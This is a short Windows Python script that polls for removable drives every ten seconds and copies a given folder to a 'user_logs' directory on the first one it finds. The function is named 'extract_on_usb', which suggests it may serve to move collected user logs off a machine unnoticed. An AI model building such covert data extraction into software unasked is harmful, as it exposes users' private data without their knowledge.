import os
import shutil
import string
import time
from ctypes import windll

def get_removable_drives():
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drive_path = f"{letter}:/"
            drive_type = windll.kernel32.GetDriveTypeW(drive_path)
            if drive_type == 2:  # DRIVE_REMOVABLE
                drives.append(drive_path)
        bitmask >>= 1
    return drives

def extract_on_usb(folder_path):
    copied = False
    while True:
        removable_drives = get_removable_drives()
        for drive in removable_drives:
            destination = os.path.join(drive, "user_logs")
            if not os.path.exists(destination) and not copied:
                try:
                    shutil.copytree(folder_path, destination)
                    copied = True
                    print(f"Copied logs to USB: {destination}")
                except Exception as e:
                    print(f"Error copying to USB: {e}")
        time.sleep(10)
